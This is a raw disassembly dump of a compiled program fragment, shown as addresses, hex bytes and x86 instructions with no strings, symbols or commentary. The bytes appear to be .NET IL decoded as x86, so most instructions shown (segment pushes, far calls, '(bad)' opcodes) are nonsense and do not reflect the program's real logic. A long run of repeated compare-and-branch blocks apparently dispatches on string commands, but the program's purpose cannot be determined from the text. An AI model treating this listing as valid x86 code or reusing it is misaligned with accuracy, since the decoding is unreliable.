  403689:	05 2c 07 11 04       	add    $0x411072c,%eax
  40368e:	28 a8 00 00 0a dc    	sub    %ch,-0x23f60000(%eax)
  403694:	2a 00                	sub    (%eax),%al
  403696:	00 00                	add    %al,(%eax)
  403698:	01 28                	add    %ebp,(%eax)
  40369a:	00 00                	add    %al,(%eax)
  40369c:	02 00                	add    (%eax),%al
  40369e:	2a 00                	sub    (%eax),%al
  4036a0:	70 9a                	jo     0x40363c
  4036a2:	00 0a                	add    %cl,(%edx)
  4036a4:	00 00                	add    %al,(%eax)
  4036a6:	00 00                	add    %al,(%eax)
  4036a8:	00 00                	add    %al,(%eax)
  4036aa:	24 00                	and    $0x0,%al
  4036ac:	82 a6 00 14 29 00 00 	andb   $0x0,0x291400(%esi)
  4036b3:	01 02                	add    %eax,(%edx)
  4036b5:	00 11                	add    %dl,(%ecx)
  4036b7:	00 ab bc 00 0c 00    	add    %ch,0xc00bc(%ebx)
  4036bd:	00 00                	add    %al,(%eax)
  4036bf:	00 1b                	add    %bl,(%ebx)
  4036c1:	30 02                	xor    %al,(%edx)
  4036c3:	00 23                	add    %ah,(%ebx)
  4036c5:	00 00                	add    %al,(%eax)
  4036c7:	00 20                	add    %ah,(%eax)
  4036c9:	00 00                	add    %al,(%eax)
  4036cb:	11 7e 13             	adc    %edi,0x13(%esi)
  4036ce:	00 00                	add    %al,(%eax)
  4036d0:	04 02                	add    $0x2,%al
  4036d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4036d3:	a9 00 00 0a 26       	test   $0x260a0000,%eax
  4036d8:	de 14 25 28 25 00 00 	ficoms 0x2528(,%eiz,1)
  4036df:	0a 0a                	or     (%edx),%cl
  4036e1:	16                   	push   %ss
  4036e2:	80 12 00             	adcb   $0x0,(%edx)
  4036e5:	00 04 28             	add    %al,(%eax,%ebp,1)
  4036e8:	27                   	daa
  4036e9:	00 00                	add    %al,(%eax)
  4036eb:	0a de                	or     %dh,%bl
  4036ed:	00 2a                	add    %ch,(%edx)
  4036ef:	00 01                	add    %al,(%ecx)
  4036f1:	10 00                	adc    %al,(%eax)
  4036f3:	00 00                	add    %al,(%eax)
  4036f5:	00 00                	add    %al,(%eax)
  4036f7:	00 0e                	add    %cl,(%esi)
  4036f9:	0e                   	push   %cs
  4036fa:	00 14 29             	add    %dl,(%ecx,%ebp,1)
  4036fd:	00 00                	add    %al,(%eax)
  4036ff:	01 1b                	add    %ebx,(%ebx)
  403701:	30 02                	xor    %al,(%edx)
  403703:	00 b6 00 00 00 21    	add    %dh,0x21000000(%esi)
  403709:	00 00                	add    %al,(%eax)
  40370b:	11 7e 17             	adc    %edi,0x17(%esi)
  40370e:	00 00                	add    %al,(%eax)
  403710:	04 2c                	add    $0x2c,%al
  403712:	20 7e 17             	and    %bh,0x17(%esi)
  403715:	00 00                	add    %al,(%eax)
  403717:	04 6f                	add    $0x6f,%al
  403719:	aa                   	stos   %al,%es:(%edi)
  40371a:	00 00                	add    %al,(%eax)
  40371c:	0a 14 80             	or     (%eax,%eax,4),%dl
  40371f:	17                   	pop    %ss
  403720:	00 00                	add    %al,(%eax)
  403722:	04 de                	add    $0xde,%al
  403724:	0e                   	push   %cs
  403725:	25 28 25 00 00       	and    $0x2528,%eax
  40372a:	0a 0a                	or     (%edx),%cl
  40372c:	28 27                	sub    %ah,(%edi)
  40372e:	00 00                	add    %al,(%eax)
  403730:	0a de                	or     %dh,%bl
  403732:	00 7e 1a             	add    %bh,0x1a(%esi)
  403735:	00 00                	add    %al,(%eax)
  403737:	04 2c                	add    $0x2c,%al
  403739:	20 7e 1a             	and    %bh,0x1a(%esi)
  40373c:	00 00                	add    %al,(%eax)
  40373e:	04 6f                	add    $0x6f,%al
  403740:	aa                   	stos   %al,%es:(%edi)
  403741:	00 00                	add    %al,(%eax)
  403743:	0a 14 80             	or     (%eax,%eax,4),%dl
  403746:	1a 00                	sbb    (%eax),%al
  403748:	00 04 de             	add    %al,(%esi,%ebx,8)
  40374b:	0e                   	push   %cs
  40374c:	25 28 25 00 00       	and    $0x2528,%eax
  403751:	0a 0b                	or     (%ebx),%cl
  403753:	28 27                	sub    %ah,(%edi)
  403755:	00 00                	add    %al,(%eax)
  403757:	0a de                	or     %dh,%bl
  403759:	00 7e 16             	add    %bh,0x16(%esi)
  40375c:	00 00                	add    %al,(%eax)
  40375e:	04 2c                	add    $0x2c,%al
  403760:	2a 7e 16             	sub    0x16(%esi),%bh
  403763:	00 00                	add    %al,(%eax)
  403765:	04 6f                	add    $0x6f,%al
  403767:	ab                   	stos   %eax,%es:(%edi)
  403768:	00 00                	add    %al,(%eax)
  40376a:	0a 7e 16             	or     0x16(%esi),%bh
  40376d:	00 00                	add    %al,(%eax)
  40376f:	04 6f                	add    $0x6f,%al
  403771:	9d                   	popf
  403772:	00 00                	add    %al,(%eax)
  403774:	0a 14 80             	or     (%eax,%eax,4),%dl
  403777:	16                   	push   %ss
  403778:	00 00                	add    %al,(%eax)
  40377a:	04 de                	add    $0xde,%al
  40377c:	0e                   	push   %cs
  40377d:	25 28 25 00 00       	and    $0x2528,%eax
  403782:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  403785:	27                   	daa
  403786:	00 00                	add    %al,(%eax)
  403788:	0a de                	or     %dh,%bl
  40378a:	00 7e 13             	add    %bh,0x13(%esi)
  40378d:	00 00                	add    %al,(%eax)
  40378f:	04 2c                	add    $0x2c,%al
  403791:	2a 7e 13             	sub    0x13(%esi),%bh
  403794:	00 00                	add    %al,(%eax)
  403796:	04 6f                	add    $0x6f,%al
  403798:	ac                   	lods   %ds:(%esi),%al
  403799:	00 00                	add    %al,(%eax)
  40379b:	0a 7e 13             	or     0x13(%esi),%bh
  40379e:	00 00                	add    %al,(%eax)
  4037a0:	04 6f                	add    $0x6f,%al
  4037a2:	ad                   	lods   %ds:(%esi),%eax
  4037a3:	00 00                	add    %al,(%eax)
  4037a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4037a8:	13 00                	adc    (%eax),%eax
  4037aa:	00 04 de             	add    %al,(%esi,%ebx,8)
  4037ad:	0e                   	push   %cs
  4037ae:	25 28 25 00 00       	and    $0x2528,%eax
  4037b3:	0a 0d 28 27 00 00    	or     0x2728,%cl
  4037b9:	0a de                	or     %dh,%bl
  4037bb:	00 28                	add    %ch,(%eax)
  4037bd:	ae                   	scas   %es:(%edi),%al
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 2a                	or     (%edx),%ch
  4037c2:	00 00                	add    %al,(%eax)
  4037c4:	01 34 00             	add    %esi,(%eax,%eax,1)
  4037c7:	00 00                	add    %al,(%eax)
  4037c9:	00 07                	add    %al,(%edi)
  4037cb:	00 12                	add    %dl,(%edx)
  4037cd:	19 00                	sbb    %eax,(%eax)
  4037cf:	0e                   	push   %cs
  4037d0:	29 00                	sub    %eax,(%eax)
  4037d2:	00 01                	add    %al,(%ecx)
  4037d4:	00 00                	add    %al,(%eax)
  4037d6:	2e 00 12             	add    %dl,%cs:(%edx)
  4037d9:	40                   	inc    %eax
  4037da:	00 0e                	add    %cl,(%esi)
  4037dc:	29 00                	sub    %eax,(%eax)
  4037de:	00 01                	add    %al,(%ecx)
  4037e0:	00 00                	add    %al,(%eax)
  4037e2:	55                   	push   %ebp
  4037e3:	00 1c 71             	add    %bl,(%ecx,%esi,2)
  4037e6:	00 0e                	add    %cl,(%esi)
  4037e8:	29 00                	sub    %eax,(%eax)
  4037ea:	00 01                	add    %al,(%ecx)
  4037ec:	00 00                	add    %al,(%eax)
  4037ee:	86 00                	xchg   %al,(%eax)
  4037f0:	1c a2                	sbb    $0xa2,%al
  4037f2:	00 0e                	add    %cl,(%esi)
  4037f4:	29 00                	sub    %eax,(%eax)
  4037f6:	00 01                	add    %al,(%ecx)
  4037f8:	1b 30                	sbb    (%eax),%esi
  4037fa:	02 00                	add    (%eax),%al
  4037fc:	29 00                	sub    %eax,(%eax)
  4037fe:	00 00                	add    %al,(%eax)
  403800:	00 00                	add    %al,(%eax)
  403802:	00 00                	add    %al,(%eax)
  403804:	7e 1c                	jle    0x403822
  403806:	00 00                	add    %al,(%eax)
  403808:	04 2c                	add    $0x2c,%al
  40380a:	13 7e 12             	adc    0x12(%esi),%edi
  40380d:	00 00                	add    %al,(%eax)
  40380f:	04 2c                	add    $0x2c,%al
  403811:	0c 7e                	or     $0x7e,%al
  403813:	1b 00                	sbb    (%eax),%eax
  403815:	00 04 17             	add    %al,(%edi,%edx,1)
  403818:	d6                   	salc
  403819:	80 1b 00             	sbbb   $0x0,(%ebx)
  40381c:	00 04 de             	add    %al,(%esi,%ebx,8)
  40381f:	0c 28                	or     $0x28,%al
  403821:	25 00 00 0a 28       	and    $0x280a0000,%eax
  403826:	27                   	daa
  403827:	00 00                	add    %al,(%eax)
  403829:	0a de                	or     %dh,%bl
  40382b:	00 2a                	add    %ch,(%edx)
  40382d:	00 00                	add    %al,(%eax)
  40382f:	00 01                	add    %al,(%ecx)
  403831:	10 00                	adc    %al,(%eax)
  403833:	00 00                	add    %al,(%eax)
  403835:	00 00                	add    %al,(%eax)
  403837:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  40383a:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  40383d:	00 00                	add    %al,(%eax)
  40383f:	01 1b                	add    %ebx,(%ebx)
  403841:	30 03                	xor    %al,(%ebx)
  403843:	00 5d 00             	add    %bl,0x0(%ebp)
  403846:	00 00                	add    %al,(%eax)
  403848:	22 00                	and    (%eax),%al
  40384a:	00 11                	add    %dl,(%ecx)
  40384c:	7e 12                	jle    0x403860
  40384e:	00 00                	add    %al,(%eax)
  403850:	04 2c                	add    $0x2c,%al
  403852:	45                   	inc    %ebp
  403853:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  403859:	0b 07                	or     (%edi),%eax
  40385b:	16                   	push   %ss
  40385c:	72 d3                	jb     0x403831
  40385e:	07                   	pop    %es
  40385f:	00 70 a2             	add    %dh,-0x5e(%eax)
  403862:	07                   	pop    %es
  403863:	17                   	pop    %ss
  403864:	7e 0a                	jle    0x403870
  403866:	00 00                	add    %al,(%eax)
  403868:	04 a2                	add    $0xa2,%al
  40386a:	07                   	pop    %es
  40386b:	18 28                	sbb    %ch,(%eax)
  40386d:	6f                   	outsl  %ds:(%esi),(%dx)
  40386e:	00 00                	add    %al,(%eax)
  403870:	06                   	push   %es
  403871:	a2 07 19 7e 0a       	mov    %al,0xa7e1907
  403876:	00 00                	add    %al,(%eax)
  403878:	04 a2                	add    $0xa2,%al
  40387a:	07                   	pop    %es
  40387b:	1a 7e 32             	sbb    0x32(%esi),%bh
  40387e:	00 00                	add    %al,(%eax)
  403880:	04 a2                	add    $0xa2,%al
  403882:	07                   	pop    %es
  403883:	28 36                	sub    %dh,(%esi)
  403885:	00 00                	add    %al,(%eax)
  403887:	0a 28                	or     (%eax),%ch
  403889:	2f                   	das
  40388a:	00 00                	add    %al,(%eax)
  40388c:	06                   	push   %es
  40388d:	17                   	pop    %ss
  40388e:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  403892:	04 28                	add    $0x28,%al
  403894:	ae                   	scas   %es:(%edi),%al
  403895:	00 00                	add    %al,(%eax)
  403897:	0a de                	or     %dh,%bl
  403899:	0e                   	push   %cs
  40389a:	25 28 25 00 00       	and    $0x2528,%eax
  40389f:	0a 0a                	or     (%edx),%cl
  4038a1:	28 27                	sub    %ah,(%edi)
  4038a3:	00 00                	add    %al,(%eax)
  4038a5:	0a de                	or     %dh,%bl
  4038a7:	00 2a                	add    %ch,(%edx)
  4038a9:	00 00                	add    %al,(%eax)
  4038ab:	00 01                	add    %al,(%ecx)
  4038ad:	10 00                	adc    %al,(%eax)
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	00 4e 4e             	add    %cl,0x4e(%esi)
  4038b6:	00 0e                	add    %cl,(%esi)
  4038b8:	29 00                	sub    %eax,(%eax)
  4038ba:	00 01                	add    %al,(%ecx)
  4038bc:	22 28                	and    (%eax),%ch
  4038be:	33 00                	xor    (%eax),%eax
  4038c0:	00 06                	add    %al,(%esi)
  4038c2:	2b 00                	sub    (%eax),%eax
  4038c4:	2a 00                	sub    (%eax),%al
  4038c6:	00 00                	add    %al,(%eax)
  4038c8:	3a 02                	cmp    (%edx),%al
  4038ca:	74 09                	je     0x4038d5
  4038cc:	00 00                	add    %al,(%eax)
  4038ce:	1b 28                	sbb    (%eax),%ebp
  4038d0:	2e 00 00             	add    %al,%cs:(%eax)
  4038d3:	06                   	push   %es
  4038d4:	2b 00                	sub    (%eax),%eax
  4038d6:	2a 00                	sub    (%eax),%al
  4038d8:	1e                   	push   %ds
  4038d9:	02 28                	add    (%eax),%ch
  4038db:	17                   	pop    %ss
  4038dc:	00 00                	add    %al,(%eax)
  4038de:	0a 2a                	or     (%edx),%ch
  4038e0:	1b 30                	sbb    (%eax),%esi
  4038e2:	08 00                	or     %al,(%eax)
  4038e4:	d0 07                	rolb   $1,(%edi)
  4038e6:	00 00                	add    %al,(%eax)
  4038e8:	23 00                	and    (%eax),%eax
  4038ea:	00 11                	add    %dl,(%ecx)
  4038ec:	02 28                	add    (%eax),%ch
  4038ee:	79 00                	jns    0x4038f0
  4038f0:	00 06                	add    %al,(%esi)
  4038f2:	28 71 00             	sub    %dh,0x0(%ecx)
  4038f5:	00 06                	add    %al,(%esi)
  4038f7:	7e 0a                	jle    0x403903
  4038f9:	00 00                	add    %al,(%eax)
  4038fb:	04 15                	add    $0x15,%al
  4038fd:	16                   	push   %ss
  4038fe:	28 af 00 00 0a 0a    	sub    %ch,0xa0a0000(%edi)
  403904:	06                   	push   %es
  403905:	16                   	push   %ss
  403906:	9a 13 13 11 13 72 df 	lcall  $0xdf72,$0x13111313
  40390d:	07                   	pop    %es
  40390e:	00 70 16             	add    %dh,0x16(%eax)
  403911:	28 5b 00             	sub    %bl,0x0(%ebx)
  403914:	00 0a                	add    %cl,(%edx)
  403916:	16                   	push   %ss
  403917:	33 2f                	xor    (%edi),%ebp
  403919:	16                   	push   %ss
  40391a:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  40391e:	04 72                	add    $0x72,%al
  403920:	df 07                	filds  (%edi)
  403922:	00 70 7e             	add    %dh,0x7e(%eax)
  403925:	0a 00                	or     (%eax),%al
  403927:	00 04 7e             	add    %al,(%esi,%edi,2)
  40392a:	1b 00                	sbb    (%eax),%eax
  40392c:	00 04 28             	add    %al,(%eax,%ebp,1)
  40392f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403930:	00 00                	add    %al,(%eax)
  403932:	0a 28                	or     (%eax),%ch
  403934:	28 00                	sub    %al,(%eax)
  403936:	00 0a                	add    %cl,(%edx)
  403938:	28 2f                	sub    %ch,(%edi)
  40393a:	00 00                	add    %al,(%eax)
  40393c:	06                   	push   %es
  40393d:	16                   	push   %ss
  40393e:	80 1b 00             	sbbb   $0x0,(%ebx)
  403941:	00 04 38             	add    %al,(%eax,%edi,1)
  403944:	56                   	push   %esi
  403945:	07                   	pop    %es
  403946:	00 00                	add    %al,(%eax)
  403948:	11 13                	adc    %edx,(%ebx)
  40394a:	72 e9                	jb     0x403935
  40394c:	07                   	pop    %es
  40394d:	00 70 16             	add    %dh,0x16(%eax)
  403950:	28 5b 00             	sub    %bl,0x0(%ebx)
  403953:	00 0a                	add    %cl,(%edx)
  403955:	16                   	push   %ss
  403956:	33 1a                	xor    (%edx),%ebx
  403958:	28 61 00             	sub    %ah,0x0(%ecx)
  40395b:	00 06                	add    %al,(%esi)
  40395d:	28 7b 00             	sub    %bh,0x0(%ebx)
  403960:	00 06                	add    %al,(%esi)
  403962:	28 b0 00 00 0a 16    	sub    %dh,0x160a0000(%eax)
  403968:	28 26                	sub    %ah,(%esi)
  40396a:	00 00                	add    %al,(%eax)
  40396c:	0a 38                	or     (%eax),%bh
  40396e:	2c 07                	sub    $0x7,%al
  403970:	00 00                	add    %al,(%eax)
  403972:	11 13                	adc    %edx,(%ebx)
  403974:	72 f1                	jb     0x403967
  403976:	07                   	pop    %es
  403977:	00 70 16             	add    %dh,0x16(%eax)
  40397a:	28 5b 00             	sub    %bl,0x0(%ebx)
  40397d:	00 0a                	add    %cl,(%edx)
  40397f:	16                   	push   %ss
  403980:	33 25 28 61 00 00    	xor    0x6128,%esp
  403986:	06                   	push   %es
  403987:	7e 13                	jle    0x40399c
  403989:	00 00                	add    %al,(%eax)
  40398b:	04 18                	add    $0x18,%al
  40398d:	6f                   	outsl  %ds:(%esi),(%dx)
  40398e:	b1 00                	mov    $0x0,%cl
  403990:	00 0a                	add    %cl,(%edx)
  403992:	7e 13                	jle    0x4039a7
  403994:	00 00                	add    %al,(%eax)
  403996:	04 6f                	add    $0x6f,%al
  403998:	ac                   	lods   %ds:(%esi),%al
  403999:	00 00                	add    %al,(%eax)
  40399b:	0a 16                	or     (%esi),%dl
  40399d:	28 26                	sub    %ah,(%esi)
  40399f:	00 00                	add    %al,(%eax)
  4039a1:	0a 38                	or     (%eax),%bh
  4039a3:	f7 06 00 00 11 13    	testl  $0x13110000,(%esi)
  4039a9:	72 fd                	jb     0x4039a8
  4039ab:	07                   	pop    %es
  4039ac:	00 70 16             	add    %dh,0x16(%eax)
  4039af:	28 5b 00             	sub    %bl,0x0(%ebx)
  4039b2:	00 0a                	add    %cl,(%edx)
  4039b4:	16                   	push   %ss
  4039b5:	33 0d 16 14 14 28    	xor    0x28141416,%ecx
  4039bb:	46                   	inc    %esi
  4039bc:	00 00                	add    %al,(%eax)
  4039be:	06                   	push   %es
  4039bf:	38 da                	cmp    %bl,%dl
  4039c1:	06                   	push   %es
  4039c2:	00 00                	add    %al,(%eax)
  4039c4:	11 13                	adc    %edx,(%ebx)
  4039c6:	72 11                	jb     0x4039d9
  4039c8:	08 00                	or     %al,(%eax)
  4039ca:	70 16                	jo     0x4039e2
  4039cc:	28 5b 00             	sub    %bl,0x0(%ebx)
  4039cf:	00 0a                	add    %cl,(%edx)
  4039d1:	16                   	push   %ss
  4039d2:	33 1b                	xor    (%ebx),%ebx
  4039d4:	17                   	pop    %ss
  4039d5:	06                   	push   %es
  4039d6:	17                   	pop    %ss
  4039d7:	9a 06 18 9a 28 b2 00 	lcall  $0xb2,$0x289a1806
  4039de:	00 0a                	add    %cl,(%edx)
  4039e0:	28 76 00             	sub    %dh,0x0(%esi)
  4039e3:	00 06                	add    %al,(%esi)
  4039e5:	28 46 00             	sub    %al,0x0(%esi)
  4039e8:	00 06                	add    %al,(%esi)
  4039ea:	38 af 06 00 00 11    	cmp    %ch,0x11000006(%edi)
  4039f0:	13 72 1f             	adc    0x1f(%edx),%esi
  4039f3:	08 00                	or     %al,(%eax)
  4039f5:	70 16                	jo     0x403a0d
  4039f7:	28 5b 00             	sub    %bl,0x0(%ebx)
  4039fa:	00 0a                	add    %cl,(%edx)
  4039fc:	16                   	push   %ss
  4039fd:	33 1a                	xor    (%edx),%ebx
  4039ff:	06                   	push   %es
  403a00:	17                   	pop    %ss
  403a01:	9a 06 18 9a 28 b2 00 	lcall  $0xb2,$0x289a1806
  403a08:	00 0a                	add    %cl,(%edx)
  403a0a:	28 76 00             	sub    %dh,0x0(%esi)
  403a0d:	00 06                	add    %al,(%esi)
  403a0f:	28 41 00             	sub    %al,0x0(%ecx)
  403a12:	00 06                	add    %al,(%esi)
  403a14:	38 85 06 00 00 11    	cmp    %al,0x11000006(%ebp)
  403a1a:	13 72 25             	adc    0x25(%edx),%esi
  403a1d:	08 00                	or     %al,(%eax)
  403a1f:	70 16                	jo     0x403a37
  403a21:	28 5b 00             	sub    %bl,0x0(%ebx)
  403a24:	00 0a                	add    %cl,(%edx)
  403a26:	16                   	push   %ss
  403a27:	33 18                	xor    (%eax),%ebx
  403a29:	06                   	push   %es
  403a2a:	17                   	pop    %ss
  403a2b:	9a 28 b2 00 00 0a 28 	lcall  $0x280a,$0xb228
  403a32:	76 00                	jbe    0x403a34
  403a34:	00 06                	add    %al,(%esi)
  403a36:	28 42 00             	sub    %al,0x0(%edx)
  403a39:	00 06                	add    %al,(%esi)
  403a3b:	26 38 5d 06          	cmp    %bl,%es:0x6(%ebp)
  403a3f:	00 00                	add    %al,(%eax)
  403a41:	11 13                	adc    %edx,(%ebx)
  403a43:	72 2b                	jb     0x403a70
  403a45:	08 00                	or     %al,(%eax)
  403a47:	70 16                	jo     0x403a5f
  403a49:	28 5b 00             	sub    %bl,0x0(%ebx)
  403a4c:	00 0a                	add    %cl,(%edx)
  403a4e:	16                   	push   %ss
  403a4f:	33 5d 17             	xor    0x17(%ebp),%ebx
  403a52:	28 b3 00 00 0a 20    	sub    %dh,0x200a0000(%ebx)
  403a58:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403a5b:	00 28                	add    %ch,(%eax)
  403a5d:	b4 00                	mov    $0x0,%ah
  403a5f:	00 0a                	add    %cl,(%edx)
  403a61:	20 0f                	and    %cl,(%edi)
  403a63:	27                   	daa
  403a64:	00 00                	add    %al,(%eax)
  403a66:	28 b5 00 00 0a de    	sub    %dh,-0x21f60000(%ebp)
  403a6c:	0c 28                	or     $0x28,%al
  403a6e:	25 00 00 0a 28       	and    $0x280a0000,%eax
  403a73:	27                   	daa
  403a74:	00 00                	add    %al,(%eax)
  403a76:	0a de                	or     %dh,%bl
  403a78:	00 28                	add    %ch,(%eax)
  403a7a:	b6 00                	mov    $0x0,%dh
  403a7c:	00 0a                	add    %cl,(%edx)
  403a7e:	1c 28                	sbb    $0x28,%al
  403a80:	67 00 00             	add    %al,(%bx,%si)
  403a83:	06                   	push   %es
  403a84:	06                   	push   %es
  403a85:	17                   	pop    %ss
  403a86:	9a 28 1f 00 00 0a 28 	lcall  $0x280a,$0x1f28
  403a8d:	b7 00                	mov    $0x0,%bh
  403a8f:	00 0a                	add    %cl,(%edx)
  403a91:	0b 73 51             	or     0x51(%ebx),%esi
  403a94:	00 00                	add    %al,(%eax)
  403a96:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403a99:	06                   	push   %es
  403a9a:	18 9a 07 6f b8 00    	sbb    %bl,0xb86f07(%edx)
  403aa0:	00 0a                	add    %cl,(%edx)
  403aa2:	07                   	pop    %es
  403aa3:	28 b9 00 00 0a 26    	sub    %bh,0x260a0000(%ecx)
  403aa9:	38 f0                	cmp    %dh,%al
  403aab:	05 00 00 11 13       	add    $0x13110000,%eax
  403ab0:	72 31                	jb     0x403ae3
  403ab2:	08 00                	or     %al,(%eax)
  403ab4:	70 16                	jo     0x403acc
  403ab6:	28 5b 00             	sub    %bl,0x0(%ebx)
  403ab9:	00 0a                	add    %cl,(%edx)
  403abb:	16                   	push   %ss
  403abc:	33 0e                	xor    (%esi),%ecx
  403abe:	06                   	push   %es
  403abf:	17                   	pop    %ss
  403ac0:	9a 16 28 3d 00 00 06 	lcall  $0x600,$0x3d2816
  403ac7:	38 d2                	cmp    %dl,%dl
  403ac9:	05 00 00 11 13       	add    $0x13110000,%eax
  403ace:	72 41                	jb     0x403b11
  403ad0:	08 00                	or     %al,(%eax)
  403ad2:	70 16                	jo     0x403aea
  403ad4:	28 5b 00             	sub    %bl,0x0(%ebx)
  403ad7:	00 0a                	add    %cl,(%edx)
  403ad9:	16                   	push   %ss
  403ada:	33 0e                	xor    (%esi),%ecx
  403adc:	06                   	push   %es
  403add:	17                   	pop    %ss
  403ade:	9a 17 28 3d 00 00 06 	lcall  $0x600,$0x3d2817
  403ae5:	38 b4 05 00 00 11 13 	cmp    %dh,0x13110000(%ebp,%eax,1)
  403aec:	72 51                	jb     0x403b3f
  403aee:	08 00                	or     %al,(%eax)
  403af0:	70 16                	jo     0x403b08
  403af2:	28 5b 00             	sub    %bl,0x0(%ebx)
  403af5:	00 0a                	add    %cl,(%edx)
  403af7:	16                   	push   %ss
  403af8:	33 13                	xor    (%ebx),%edx
  403afa:	72 67                	jb     0x403b63
  403afc:	08 00                	or     %al,(%eax)
  403afe:	70 16                	jo     0x403b16
  403b00:	16                   	push   %ss
  403b01:	15 28 ba 00 00       	adc    $0xba28,%eax
  403b06:	0a 26                	or     (%esi),%ah
  403b08:	38 91 05 00 00 11    	cmp    %dl,0x11000005(%ecx)
  403b0e:	13 72 97             	adc    -0x69(%edx),%esi
  403b11:	08 00                	or     %al,(%eax)
  403b13:	70 16                	jo     0x403b2b
  403b15:	28 5b 00             	sub    %bl,0x0(%ebx)
  403b18:	00 0a                	add    %cl,(%edx)
  403b1a:	16                   	push   %ss
  403b1b:	33 13                	xor    (%ebx),%edx
  403b1d:	72 ab                	jb     0x403aca
  403b1f:	08 00                	or     %al,(%eax)
  403b21:	70 16                	jo     0x403b39
  403b23:	16                   	push   %ss
  403b24:	15 28 ba 00 00       	adc    $0xba28,%eax
  403b29:	0a 26                	or     (%esi),%ah
  403b2b:	38 6e 05             	cmp    %ch,0x5(%esi)
  403b2e:	00 00                	add    %al,(%eax)
  403b30:	11 13                	adc    %edx,(%ebx)
  403b32:	72 db                	jb     0x403b0f
  403b34:	08 00                	or     %al,(%eax)
  403b36:	70 16                	jo     0x403b4e
  403b38:	28 5b 00             	sub    %bl,0x0(%ebx)
  403b3b:	00 0a                	add    %cl,(%edx)
  403b3d:	16                   	push   %ss
  403b3e:	33 13                	xor    (%ebx),%edx
  403b40:	72 ed                	jb     0x403b2f
  403b42:	08 00                	or     %al,(%eax)
  403b44:	70 16                	jo     0x403b5c
  403b46:	16                   	push   %ss
  403b47:	15 28 ba 00 00       	adc    $0xba28,%eax
  403b4c:	0a 26                	or     (%esi),%ah
  403b4e:	38 4b 05             	cmp    %cl,0x5(%ebx)
  403b51:	00 00                	add    %al,(%eax)
  403b53:	11 13                	adc    %edx,(%ebx)
  403b55:	72 0d                	jb     0x403b64
  403b57:	09 00                	or     %eax,(%eax)
  403b59:	70 16                	jo     0x403b71
  403b5b:	28 5b 00             	sub    %bl,0x0(%ebx)
  403b5e:	00 0a                	add    %cl,(%edx)
  403b60:	16                   	push   %ss
  403b61:	33 11                	xor    (%ecx),%edx
  403b63:	06                   	push   %es
  403b64:	17                   	pop    %ss
  403b65:	9a 16 16 15 28 ba 00 	lcall  $0xba,$0x28151616
  403b6c:	00 0a                	add    %cl,(%edx)
  403b6e:	26 38 2a             	cmp    %ch,%es:(%edx)
  403b71:	05 00 00 11 13       	add    $0x13110000,%eax
  403b76:	72 1f                	jb     0x403b97
  403b78:	09 00                	or     %eax,(%eax)
  403b7a:	70 16                	jo     0x403b92
  403b7c:	28 5b 00             	sub    %bl,0x0(%ebx)
  403b7f:	00 0a                	add    %cl,(%edx)
  403b81:	16                   	push   %ss
  403b82:	33 42 7e             	xor    0x7e(%edx),%eax
  403b85:	1f                   	pop    %ds
  403b86:	00 00                	add    %al,(%eax)
  403b88:	04 6f                	add    $0x6f,%al
  403b8a:	bb 00 00 0a de       	mov    $0xde0a0000,%ebx
  403b8f:	0e                   	push   %cs
  403b90:	25 28 25 00 00       	and    $0x2528,%eax
  403b95:	0a 0d 28 27 00 00    	or     0x2728,%cl
  403b9b:	0a de                	or     %dh,%bl
  403b9d:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403ba0:	06                   	push   %es
  403ba1:	43                   	inc    %ebx
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	06                   	push   %es
  403ba5:	73 a1                	jae    0x403b48
  403ba7:	00 00                	add    %al,(%eax)
  403ba9:	0a 73 a2             	or     -0x5e(%ebx),%dh
  403bac:	00 00                	add    %al,(%eax)
  403bae:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  403bb4:	7e 1f                	jle    0x403bd5
  403bb6:	00 00                	add    %al,(%eax)
  403bb8:	04 06                	add    $0x6,%al
  403bba:	17                   	pop    %ss
  403bbb:	9a 6f bc 00 00 0a 38 	lcall  $0x380a,$0xbc6f
  403bc2:	d8 04 00             	fadds  (%eax,%eax,1)
  403bc5:	00 11                	add    %dl,(%ecx)
  403bc7:	13 72 33             	adc    0x33(%edx),%esi
  403bca:	09 00                	or     %eax,(%eax)
  403bcc:	70 16                	jo     0x403be4
  403bce:	28 5b 00             	sub    %bl,0x0(%ebx)
  403bd1:	00 0a                	add    %cl,(%edx)
  403bd3:	16                   	push   %ss
  403bd4:	33 20                	xor    (%eax),%esp
  403bd6:	7e 1f                	jle    0x403bf7
  403bd8:	00 00                	add    %al,(%eax)
  403bda:	04 6f                	add    $0x6f,%al
  403bdc:	bb 00 00 0a de       	mov    $0xde0a0000,%ebx
  403be1:	0f 25                	(bad)
  403be3:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  403be9:	04 28                	add    $0x28,%al
  403beb:	27                   	daa
  403bec:	00 00                	add    %al,(%eax)
  403bee:	0a de                	or     %dh,%bl
  403bf0:	00 38                	add    %bh,(%eax)
  403bf2:	a8 04                	test   $0x4,%al
  403bf4:	00 00                	add    %al,(%eax)
  403bf6:	11 13                	adc    %edx,(%ebx)
  403bf8:	72 45                	jb     0x403c3f
  403bfa:	09 00                	or     %eax,(%eax)
  403bfc:	70 16                	jo     0x403c14
  403bfe:	28 5b 00             	sub    %bl,0x0(%ebx)
  403c01:	00 0a                	add    %cl,(%edx)
  403c03:	16                   	push   %ss
  403c04:	33 43 7e             	xor    0x7e(%ebx),%eax
  403c07:	20 00                	and    %al,(%eax)
  403c09:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403c0c:	bb 00 00 0a de       	mov    $0xde0a0000,%ebx
  403c11:	0f 25                	(bad)
  403c13:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  403c19:	05 28 27 00 00       	add    $0x2728,%eax
  403c1e:	0a de                	or     %dh,%bl
  403c20:	00 14 fe             	add    %dl,(%esi,%edi,8)
